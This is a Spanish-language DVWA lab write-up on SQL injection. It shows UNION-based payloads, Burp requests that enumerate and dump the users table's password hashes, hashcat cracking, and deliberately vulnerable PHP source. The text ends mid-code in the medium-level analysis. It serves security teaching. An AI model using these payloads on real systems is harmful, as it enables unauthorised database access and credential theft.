# SQL Injection (SQLi)

## Índice

1. [Introducción a la inyección SQL](#1-introducción-a-la-inyección-sql)
   - [Tipos de ataques SQLi](#11-tipos-de-ataques-sqli)
   - [Ejemplo de código vulnerable](#12-ejemplo-de-código-vulnerable)
2. [SQL Injection en acción — nivel low](#2-sql-injection-en-acción--nivel-low)
   - [Detección de la vulnerabilidad](#21-detección-de-la-vulnerabilidad)
   - [Enumeración de la base de datos](#22-enumeración-de-la-base-de-datos)
   - [Número de columnas con ORDER BY](#23-número-de-columnas-con-order-by)
   - [Número de columnas con UNION](#24-número-de-columnas-con-union)
   - [Tipo de datos de las columnas](#25-tipo-de-datos-de-las-columnas)
   - [Versión, base de datos y usuario](#26-versión-base-de-datos-y-usuario)
   - [Tablas y campos](#27-tablas-y-campos)
   - [Extracción de contraseñas](#28-extracción-de-contraseñas)
   - [Hashcracking](#29-hashcracking)
   - [Análisis del código fuente — nivel low](#210-análisis-del-código-fuente--nivel-low)
3. [SQL Injection en acción — nivel medium](#3-sql-injection-en-acción--nivel-medium)
   - [Detección y bypass de mysqli_real_escape_string](#31-detección-y-bypass-de-mysqli_real_escape_string)
   - [Enumeración y extracción — nivel medium](#32-enumeración-y-extracción--nivel-medium)
   - [Análisis del código fuente — nivel medium](#33-análisis-del-código-fuente--nivel-medium)
4. [SQL Injection en acción — nivel high](#4-sql-injection-en-acción--nivel-high)
   - [Particularidad del nivel high: variables de sesión](#41-particularidad-del-nivel-high-variables-de-sesión)
   - [Análisis del código fuente — nivel high](#42-análisis-del-código-fuente--nivel-high)
5. [Prevención — nivel Impossible](#5-prevención--nivel-impossible)

---

## 1. Introducción a la inyección SQL

La inyección SQL (SQLi) es una vulnerabilidad grave que se produce cuando un atacante puede manipular la consulta de una aplicación web, inyectando código SQL malicioso a través de las entradas del usuario. Esto puede provocar acceso no autorizado a la base de datos, fugas de información, elusión de sistemas de autenticación o el control total de la aplicación.

---

### 1.1 Tipos de ataques SQLi

| Tipo | Descripción | Condición necesaria |
|------|-------------|---------------------|
| **Ataque por error** | El más sencillo de explotar: la aplicación devuelve los errores producidos por las consultas. A partir de los mensajes de error se puede extraer información sobre la estructura de la base de datos, tablas, campos, etc. | La aplicación muestra errores SQL al usuario |
| **Ataque por union** | Aprovecha que la aplicación devuelve un resultado visible, y mediante el operador `UNION` se fuerza la extracción de información adicional de otras tablas. | La respuesta de la aplicación muestra datos de la consulta |
| **Boolean-based** | La aplicación es vulnerable pero no devuelve errores ni datos directos. Se usa el operador `AND` junto con condiciones booleanas (`true`/`false`) para deducir información bit a bit a través de la respuesta de la aplicación. | La aplicación da respuestas diferenciadas según el resultado |
| **Time-based** | Similar al anterior en concepto, pero el resultado de la consulta se deduce por el tiempo de respuesta, inyectando un retardo con la función `SLEEP()` o equivalente. | La aplicación no devuelve errores ni respuestas diferenciadas |
| **Out-of-band** | Se inyecta una consulta que, en función del resultado, genera o no una conexión de red hacia un equipo controlado por el atacante. | El servidor puede realizar conexiones salientes |

> **Nota:** Las vulnerabilidades SQLi no ocurren únicamente dentro de la cláusula `WHERE` de una sentencia `SELECT`. También pueden aparecer en: nombres de tabla o columna dentro de `SELECT`, cláusulas `ORDER BY`, valores en sentencias `UPDATE`, y valores en sentencias `INSERT`.

---

### 1.2 Ejemplo de código vulnerable

El siguiente código PHP es un ejemplo clásico de código vulnerable a SQLi. Recoge un identificador numérico (`user_id`) de un campo de texto del formulario, construye una consulta SQL concatenando directamente la entrada del usuario, y devuelve información del usuario si existe:

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // Get input
        $id = $_REQUEST[ 'id' ];

        switch ($_DVWA['SQLI_DB']) {
                case MYSQL:
                        // Check database
                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
                        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

                        // Get results
                        while( $row = mysqli_fetch_assoc( $result ) ) {
                                // Get values
                                $first = $row["first_name"];
                                $last  = $row["last_name"];

                                // Feedback for end user
                                $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                        }

                        mysqli_close($GLOBALS["___mysqli_ston"]);
                        break;
                case SQLITE:
                        global $sqlite_db_connection;

                        #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
                        #$sqlite_db_connection->enableExceptions(true);

                        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
                        #print $query;
                        try {
                                $results = $sqlite_db_connection->query($query);
                        } catch (Exception $e) {
                                echo 'Caught exception: ' . $e->getMessage();
                                exit();
                        }

                        if ($results) {
                                while ($row = $results->fetchArray()) {
                                        // Get values
                                        $first = $row["first_name"];
                                        $last  = $row["last_name"];

                                        // Feedback for end user
                                        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                                }
                        } else {
                                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
                        }
                        break;
        }
}SS
?>
```

El problema está en que se recoge y confía en la entrada del usuario sin realizar ninguna validación o saneamiento, permitiendo que un atacante inserte código SQL que altera el funcionamiento esperado de la consulta. Por ejemplo, si un atacante introduce como ID de usuario `1 OR 1=1#`, obtendrá la información de todos los usuarios almacenados en la base de datos.

> **Advertencia:** La concatenación directa de entradas del usuario en consultas SQL es el origen de todas las vulnerabilidades SQLi. La solución correcta son las consultas parametrizadas (*prepared statements*), no el filtrado o escape de caracteres, que puede ser eludido.

---

## 2. SQL Injection en acción — nivel low

**Objetivo:** descubrir las contraseñas de todos los usuarios aprovechando una vulnerabilidad SQLi en el formulario de búsqueda de la sección SQL Injection de DVWA.

Tras configurar el nivel de seguridad en DVWA a `Low`, se accede a la sección `SQL Injection`, donde aparece un formulario que permite buscar información de un usuario usando su identificador numérico. Aparentemente hay cinco usuarios con identificadores del 1 al 5.

Se usa Burp Suite para capturar una consulta legítima y enviarla a Repeater, lo que facilita el trabajo de inyección y análisis de respuestas.

---

### 2.1 Detección de la vulnerabilidad

Para detectar una vulnerabilidad SQLi hay que analizar el punto de entrada y estudiar su respuesta ante ciertas entradas como `'`, `"`, o condiciones booleanas del tipo `OR 1=1`, `OR 1=2`, `AND 1=1`, etc.

Se comienza probando con `'`, lo que genera el siguiente error:

```sql
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /var/www/html/dvwa/vulnerabilities/sqli/source/low.php:11 Stack trace: #0 /var/www/html/dvwa/vulnerabilities/sqli/source/low.php(11): mysqli_query() #1 /var/www/html/dvwa/vulnerabilities/sqli/index.php(34): require_once('...') #2 {main} thrown in /var/www/html/dvwa/vulnerabilities/sqli/source/low.php on line 11
```

De este error se pueden extraer dos conclusiones importantes:

- El formulario **es vulnerable a SQLi**, ya que la entrada del usuario interfiere con la consulta que la aplicación hace a la base de datos.
- El sistema gestor de base de datos es **MariaDB**: *check the manual that corresponds to your MariaDB server version*.

Con esta información, y sabiendo que la página devuelve el `first_name` y el `surname` de un usuario, se puede deducir que la consulta SQL será algo similar a `SELECT first_name, surname FROM users WHERE id = '$id';`.

![Consulta id = 1](./imagenes/sql%20injection/01.png)

En este momento se sabe que: hay una base de datos con una tabla que tiene al menos tres columnas (id, nombre y apellido), el valor introducido en el formulario se inyecta directamente en la consulta, y los valores devueltos parecen ser de tipo *string*. Se desconoce el nombre exacto de la base de datos, la tabla y sus campos.

Otras pruebas como `' OR 1=1#` confirman la vulnerabilidad y devuelven los datos de todos los usuarios:

```sql
' OR 1=1# ou ' OR 1=1-- ou ' OR 1=1--
```

![Consulta id = 1 o 1=1](./imagenes/sql%20injection/02.png)

> **Nota:** En MariaDB los comentarios pueden hacerse con `#` o con `-- ` (con un espacio en blanco tras los dos guiones). Al inyectar desde Burp Suite, `#` se codifica como `%23` y el espacio tras `--` se representa con `+`, resultando en `--+`.

```bash
http://192.168.100.4/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+%23&Submit=Submit#
```

---

### 2.2 Enumeración de la base de datos

Una vez confirmada la vulnerabilidad SQLi, se procede a examinar la base de datos y extraer información. El proceso sigue esta metodología:

| Paso | Objetivo | Técnica |
|------|----------|---------|
| 1 | Número de columnas | `ORDER BY` o `UNION SELECT NULL` |
| 2 | Tipo de datos de las columnas | `UNION SELECT 'a', NULL` |
| 3 | Versión, base de datos y usuario | `version()`, `database()`, `user()` |
| 4 | Tablas de la base de datos | `information_schema.tables` |
| 5 | Columnas de cada tabla | `information_schema.columns` |
| 6 | Extracción de datos | `UNION SELECT campo1, campo2 FROM tabla` |

---

### 2.3 Número de columnas con ORDER BY

`ORDER BY` permite ordenar el resultado de una consulta en base a diferentes columnas. Para descubrir el número de columnas, se modifica la consulta para ordenar por la primera columna, luego por la segunda, luego por la tercera, etc., hasta forzar un error al solicitar la ordenación en base a una columna que no existe.

```sql
1' ORDER BY 1 # 
1' ORDER BY 2 # 
1' ORDER BY 3 # 
```

En el momento de hacer el ORDER BY 3 en la tabla SQL se produce el siguiente error porque solo hay 2 columnas:

```sql
Fatal error: Uncaught mysqli_sql_exception: Unknown column '3' in 'ORDER BY' in /var/www/html/dvwa/vulnerabilities/sqli/source/low.php:11 Stack trace: #0 /var/www/html/dvwa/vulnerabilities/sqli/source/low.php(11): mysqli_query() #1 /var/www/html/dvwa/vulnerabilities/sqli/index.php(34): require_once('...') #2 {main} thrown in /var/www/html/dvwa/vulnerabilities/sqli/source/low.php on line 11
```

Al intentar ordenar por la columna 1 con la sintaxis `1' ORDER BY 1`, la consulta SQL resultante sería `SELECT first_name, surname FROM users WHERE id = '1' ORDER BY 1';`, lo que genera un error de sintaxis por la comilla final. Para evitarlo se añade el símbolo de comentario al final de la inyección.

La petición correcta en Burp Suite usa:

- `1'order+by+1%23&Submit=Submit` si se usa `#` (codificado como `%23`)
- `1'order+by+1--+&Submit=Submit` si se usa `-- ` (el `+` final representa el espacio)

La petición con `ORDER BY 1` no produce error:

```bash
GET /dvwa/vulnerabilities/sqli/?id=1'order+by+1%23&Submit=Submit HTTP/1.1
Host: 192.168.100.4
[...]
Cookie: PHPSESSID=435832gkr0hvsi9bg2gvhkov1a; security=low
```

![Burp suite ORDER BY 1](./imagenes/sql%20injection/04.png)

La petición con `ORDER BY 2` tampoco produce error. 

En cambio, con `ORDER BY 3` se obtiene:

```bash
GET /dvwa/vulnerabilities/sqli/?id=1'order+by+3%23&Submit=Submit HTTP/1.1
Host: 192.168.100.4
[...]

Fatal error: Uncaught mysqli_sql_exception: Unknown column '3' in 'order clause'
```

El error `Unknown column '3' in 'order clause'` confirma que la consulta devuelve **exactamente dos columnas**, por lo que la consulta SQL es similar a `SELECT first_name, surname FROM users WHERE id = '$id';`.

![Burp suite ORDER BY 3](./imagenes/sql%20injection/05.png)

---

### 2.4 Número de columnas con UNION

El operador `UNION` permite combinar el conjunto de resultados de dos o más sentencias `SELECT`, respetando tres condiciones: cada `SELECT` debe tener el mismo número de columnas, las columnas deben tener tipos de datos similares, y las columnas deben estar en el mismo orden. Se puede usar `NULL` como valor comodín para evitar problemas de compatibilidad de tipos.

```sql
' UNION SELECT NULL#
' UNION SELECT NULL,NULL#
' UNION SELECT NULL,NULL,NULL#
[....]
```

Con una sola columna en el `UNION` se obtiene un error que confirma la incompatibilidad:

![Consulta incorrecta con UNION](./imagenes/sql%20injection/06.png)

```bash
http://192.168.100.4/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+NULL%23&Submit=Submit#
```

```sql
GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+NULL%23&Submit=Submit HTTP/1.1
[...]

Fatal error: The used SELECT statements have a different number of columns
```

Con dos columnas en el `UNION` la consulta se ejecuta correctamente, confirmando que la consulta original devuelve **dos columnas**:

![Consulta correcta con UNION](./imagenes/sql%20injection/07.png)

```bash
http://192.168.100.4/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+NULL%2CNULL%23&Submit=Submit#
```

```sql
GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+NULL%2C%23&Submit=Submit HTTP/1.1
[...]
```

> **Importante:** Conocer el número exacto de columnas que devuelve la consulta original es imprescindible para que el operador `UNION` funcione. Todas las consultas de extracción de información posteriores dependen de este dato.

---

### 2.5 Tipo de datos de las columnas

El siguiente paso es descubrir qué columnas tienen tipo de datos *string*, ya que serán las que puedan mostrar los datos extraídos. Se lanza una batería de consultas con `UNION` sustituyendo `NULL` por la cadena `'a'`; si el tipo de columna no es compatible, se producirá un error:

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

Al escribir `UNION SELECT 'a', NULL--`, estamos pidiendo a la base de datos que combine los resultados de la consulta original con una nueva fila donde la primera columna es la letra 'a' y la segunda es nula (vacía). En caso de error, se confirma que el tipo de columna no es compatible. Si se produce un error, significa que el tipo de columna no es compatible con el tipo de datos que se está intentando insertar, en este caso, una cadena de texto.

![Tipo de datos con UNION](./imagenes/sql%20injection/08.png)

![Tipo de datos con UNION 2](./imagenes/sql%20injection/09.png)

En este caso se confirma que **ambas columnas son de tipo string**, como ya se había deducido al analizar el resultado que proporciona la aplicación.

Primera columna (petición `1' union select 'a',null--`):

```bash
GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+'a'%2CNULL%23&Submit=Submit HTTP/1.1
```

Segunda columna (petición `1' union select null,'a'--`):

```bash
GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+NULL%2C'a'%23&Submit=Submit HTTP/1.1
```

---

### 2.6 Versión, base de datos y usuario

Usando las funciones de información de MariaDB `version()`, `database()` y `user()` es posible determinar la versión del gestor, el nombre de la base de datos activa y el usuario con el que la aplicación se conecta:

**Versión:** `' union select NULL,version() --` o `1' union select NULL,version() --`

```bash
GET /dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+NULL%2CVERSION()%23&Submit=Submit HTTP/1.1
```

![Version](./imagenes/sql%20injection/10.png)

La respuesta devuelve `10.11.14-MariaDB-0ubuntu0.24.04.11`.

**Base de datos:** `' union select NULL,database()--`

```bash
GET /dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+NULL%2CDATABASE()%23&Submit=Submit# HTTP/1.1
```

![Base de datos](./imagenes/sql%20injection/11.png)

La respuesta devuelve `dvwa`.

**Usuario:** `' union select 1,user() --`

```
GET /dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+NULL%2CUSER()%23&Submit=Submit# HTTP/1.1
```

![Usuario de la base de datos](./imagenes/sql%20injection/12.png)

La respuesta devuelve `dvwa@localhost`.

---

### 2.7 Tablas y campos

Es posible descubrir las tablas y campos de la base de datos `dvwa` consultando la base de datos del sistema `information_schema`, que contiene metadatos sobre todas las demás bases de datos. Las tablas clave son `information_schema.tables` e `information_schema.columns`.

**Tablas de la base de datos `dvwa`:**

```sql
' union select 1,table_name from information_schema.tables where table_schema='dvwa'#
```

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+1%2Ctable_name+from+information_schema.tables+where+table_schema%3D'dvwa'%23&Submit=Submit HTTP/1.1
```

![Tablas de la base de datos](./imagenes/sql%20injection/13.png)

![Tablas de la base de datos 2](./imagenes/sql%20injection/14.png)


El resultado devuelve cuatro tablas: `users`, `guestbook`, `access_log` y `security_log`.

**Columnas de la tabla `users`:**

```sql
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' #
```

```bash
GET /dvwa/vulnerabilities/sqli/?id='+UNION+SELECT+column_name%2C+data_type+FROM+information_schema.columns+WHERE+table_name%3D'users'+AND+table_schema%3D'dvwa'+%23&Submit=Submit HTTP/1.1
```

![Columnas de la tabla users](./imagenes/sql%20injection/15.png)

![Columnas de la tabla users 2](./imagenes/sql%20injection/16.png)

La tabla `users` tiene la siguiente estructura:

| user_id | first_name | last_name | user | password | avatar | last_login | failed_login | role | account_enabled |
|---------|------------|-----------|------|----------|--------|------------|--------------|------|-----------------|

Usando `group_concat()` se obtiene el mismo resultado agrupando todos los nombres de columna en una única entrada:

```sql
' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+1%2Cgroup_concat(column_name)+from+information_schema.columns+where+table_name%3D'users'+%23&Submit=Submit HTTP/1.1
```

![Columnas de la tabla users 3](./imagenes/sql%20injection/17.png)

**Columnas de la tabla `guestbook`:** `comment_id`, `comment` y `name`.

```sql
' union select 1,column_name from information_schema.columns where table_name='guestbook'#
```

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+1%2Ccolumn_name+from+information_schema.columns+where+table_name%3D'guestbook'%23&Submit=Submit HTTP/1.1
```

![Columnas de la tabla guestbook](./imagenes/sql%20injection/18.png)

---

### 2.8 Extracción de contraseñas

Una vez conocida la estructura de la tabla `users`, se procede a la extracción de las contraseñas:

```sql
' union select user,password from users#
```

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+user%2Cpassword+from+users%23&Submit=Submit HTTP/1.1
Host: 192.168.100.4
[...]
Cookie: PHPSESSID=435832gkr0hvsi9bg2gvhkov1a; security=low
```

![Usuarios con contraseña](./imagenes/sql%20injection/19.png)

En caso de necesitar extraer más campos de información y debido a la limitación de dos columnas, se puede usar `group_concat()` o `concat()` para combinar múltiples campos en una sola columna:

**Con `group_concat()`:** `' union select 1,group_concat(user_id,':',user,':',password SEPARATOR '<br>') from users#`

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+1%2Cgroup_concat(user_id%2C'%3A'%2Cuser%2C'%3A'%2Cpassword+SEPARATOR+'<br>')+from+users%23&Submit=Submit HTTP/1.1
```

![Usuarios con contraseña 2](./imagenes/sql%20injection/20.png)

**Con `concat()`:** `' union select 1,concat(user_id,':',user,':',password) from users#`

```bash
GET /dvwa/vulnerabilities/sqli/?id='+union+select+1%2Cconcat(user_id%2C'%3A'%2Cuser%2C'%3A'%2Cpassword)+from+users%23&Submit=Submit HTTP/1.1
```

![Usuarios con contraseña 3](./imagenes/sql%20injection/21.png)

El resultado es el descubrimiento de los hashes de contraseña de todos los usuarios. Los usuarios `admin` y `smithy` comparten la misma contraseña:

```bash
1:admin:5f4dcc3b5aa765d61d8327deb882cf99
2:gordonb:e99a18c428cb38d5f260853678922e03
3:1337:8d3533d75ae2c3966d7e0d4fcc69216b
4:pablo:0d107d09f5bbe40cade3de5c71e9e9b7
5:smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

---

### 2.9 Hashcracking

Una vez obtenidos los hashes de las contraseñas, el siguiente paso es romperlos. Primero se identifica el algoritmo hash utilizado con `hash-identifier` o `hashid`:

```bash
┌──(kali㉿kali)-[~]
└─$ hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
```

Una vez descubierto que probablemente se trata de MD5, se puede optar por una búsqueda online o atacar los hashes con `hashcat` o `john`. La herramienta online [crackstation.net](https://crackstation.net) descubre todas las contraseñas en segundos.

**Con `hashcat` y el diccionario `rockyou`:**

Se crea un archivo con los hashes y se descomprime el diccionario si es necesario:

```bash
┌──(kali㉿kali)-[~]
└─$ nano hash.txt
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7

┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
...
```

El resultado devuelto por `hashcat` confirma las cuatro contraseñas en claro:

```bash
5f4dcc3b5aa765d61d8327deb882cf99:password                 
e99a18c428cb38d5f260853678922e03:abc123                   
0d107d09f5bbe40cade3de5c71e9e9b7:letmein                  
8d3533d75ae2c3966d7e0d4fcc69216b:charley                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt
Time.Started.....: Thu May  7 13:45:20 2026 (0 secs)
Time.Estimated...: Thu May  7 13:45:20 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
...
```

| Usuario | Hash MD5 | Contraseña |
|---------|----------|------------|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | password |
| gordonb | `e99a18c428cb38d5f260853678922e03` | abc123 |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | charley |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | letmein |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | password |

> **Nota:** El parámetro `-m 0` en `hashcat` especifica el modo MD5. El archivo de hashes debe contener un hash por línea. `hashcat` admite GPUs para acelerar el proceso enormemente.

---

### 2.10 Análisis del código fuente — nivel low

Revisando el código fuente se comprueba que el programador no implementó ninguna medida de seguridad: recoge el valor introducido a través del formulario en `$id`, lanza una consulta SQL concatenando directamente la entrada del usuario, y muestra los resultados:

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ?
            mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                $first = $row["first_name"];
                $last  = $row["last_name"];
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            mysqli_close($GLOBALS["___mysqli_ston"]);
            break;

        case SQLITE:
            global $sqlite_db_connection;
            $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }
            if ($results) {
                while ($row = $results->fetchArray()) {
                    $first = $row["first_name"];
                    $last  = $row["last_name"];
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}
?>
```

---

## 3. SQL Injection en acción — nivel medium

Tras configurar el nivel de seguridad en DVWA a `medium` y acceder a la sección de SQL Injection, se aprecian dos cambios con respecto al formulario del nivel `low`: el campo de texto ha sido sustituido por una lista desplegable donde se elige el id del usuario, y se usa el método `POST` para enviar los datos al servidor:

```html
<form action="#" method="POST">
    <p>
        User ID:
        <select name="id">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
            <option value="4">4</option>
            <option value="5">5</option>
        </select>
        <input type="submit" name="Submit" value="Submit">
    </p>
</form>
```

> **Recuerda:** La sustitución del campo de texto por un desplegable es una medida de seguridad cosmética, no técnica. Aunque el navegador solo permita seleccionar valores del 1 al 5, un atacante siempre puede interceptar la petición con Burp Suite y modificar el parámetro `id` antes de que llegue al servidor.

---

### 3.1 Detección y bypass de mysqli_real_escape_string

Desde Repeater, se cambian los datos originales enviados `id=1&Submit=Submit` por `id='&Submit=Submit` para probar la respuesta de la aplicación a la inyección de `'`:

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.100.4
[...]
Cookie: PHPSESSID=e6q6d4qrb22u8p0s716rjo2p17; security=medium

id='&Submit=Submit
```

El error devuelto es:

```bash
Fatal error: You have an error in your SQL syntax; check the manual that corresponds to your
MariaDB server version for the right syntax to use near '\'' at line 1
```

El mensaje muestra `syntax to use near '\''`, indicando que el carácter `'` fue **escapado** con una barra invertida. Esto apunta a que el programador implementó la función `mysqli_real_escape_string()`, que escapa los caracteres especiales de una cadena para usarla en una sentencia SQL.

![Error al usar ' a mysqli_real_escape_string() en DVWA](./imagenes/sql%20injection/22.png)

Repitiendo la prueba con `"` y `\` se obtienen resultados similares:

```bash
syntax to use near '\"'
syntax to use near '\\'
```

Al estar `'` y `"` bloqueadas, se pueden inyectar directamente expresiones lógicas como `OR 1=1` o `AND 1=1`, o comentarios con `#` o `--`, ya que no contienen comillas:

**Comentario:** `1-- comentario`

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1-- comentario&Submit=Submit
```

**OR lógico:** `1 or 1=1`

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+or+1%3d1&Submit=Submit
```

![Inyección OR 1=1 en DVWA](./imagenes/sql%20injection/23.png)

Ambas inyecciones funcionan, lo que confirma la vulnerabilidad SQLi. Descubierto el método de inyección, se procede a la enumeración y extracción de información.

> **Advertencia:** `mysqli_real_escape_string()` es insuficiente como única medida de protección contra SQLi. En este nivel, el parámetro no está entrecomillado en la consulta (`WHERE user_id = $id` en lugar de `WHERE user_id = '$id'`), por lo que el escape de comillas no tiene efecto y se pueden inyectar expresiones numéricas y palabras clave SQL directamente.

---

### 3.2 Enumeración y extracción — nivel medium

El proceso de enumeración es idéntico al del nivel *low*, con la diferencia de que las inyecciones se realizan vía `POST` y sin comillas alrededor de los valores inyectados.

**Número de columnas** (técnica `ORDER BY`): se descubren dos columnas al obtener error con `id=1+order+by+3`:

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+order+by+3&Submit=Submit

Fatal error: Unknown column '3' in 'order clause'
```

![ORDER BY 3 en DVWA nivel medium](./imagenes/sql%20injection/24.png)

**Tipo de datos**: al no poder usar comillas, se emplean alternativas para representar cadenas de texto. Las dos opciones equivalentes son usar `char()` con el valor ASCII del carácter, o usar su representación hexadecimal:

- `char(97)` equivale a la letra `a`
- `0x61` es la representación hexadecimal de `a`

Con `char()`: `1 union select char(97),null`

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+union+select+char(97),null&Submit=Submit
```

![Tipo de dato 1](./imagenes/sql%20injection/25.png)

Con hexadecimal: `1 union select null,0x61`

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+union+select+null,0x61&Submit=Submit
```

![Tipo de dato 1](./imagenes/sql%20injection/26.png)

Se confirma que las dos columnas devueltas son de tipo *string*.

**Versión y base de datos:**

```bash
id=1+union+select+1,version()&Submit=Submit
id=1+union+select+1,database()&Submit=Submit
```

![Versión de la base de datos](./imagenes/sql%20injection/27.png)
![Base de datos](./imagenes/sql%20injection/28.png)

**Tablas**: la consulta para ver las tablas de `dvwa` tiene el problema de la comilla en `table_schema='dvwa'`. Para resolverlo, se obtiene la representación hexadecimal de `dvwa` (`0x64767761`) usando la sección `Decoder` de Burp Suite o CyberChef:

![Decoder de Burp Suite](./imagenes/sql%20injection/29.png)

```bash
id=1+union+select+1,table_name+from+information_schema.tables+where+table_schema=0x64767761&Submit=Submit
```

![Tablas de la base de datos](./imagenes/sql%20injection/30.png)

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+union+select+1,table_name+from+information_schema.tables+where+table_schema%3d0x64767761&Submit=Submit
```

El resultado devuelve las mismas tablas: `users`, `guestbook`, `access_log` y `security_log`.

**Columnas de la tabla `users`**: se convierte `users` a hexadecimal (`0x7573657273`):

```bash
id=1+union+select+1,column_name+from+information_schema.columns+where+table_name=0x7573657273&Submit=Submit
```

![Columnas de la tabla de datos](./imagenes/sql%20injection/31.png)

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+union+select+1,column_name+from+information_schema.columns+where+table_name%3d0x7573657273&Submit=Submit
```

Se descubren los mismos diez campos: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`, `role` y `account_enabled`.

**Extracción de hashes:**

```bash
id=1+union+select+user,password+from users&Submit=Submit
```

![Usuarios y hashes de la tabla de datos](./imagenes/sql%20injection/32.png)

```bash
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
[...]
id=1+union+select+user,password+from+users&Submit=Submit
```

---

### 3.3 Análisis del código fuente — nivel medium

La revisión del código fuente confirma el uso de `mysqli_real_escape_string()` para limpiar de caracteres especiales la entrada, pero revela que el parámetro de la consulta **no está entrecomillado**, por lo que la protección no es efectiva:

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    $id = $_POST[ 'id' ];
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
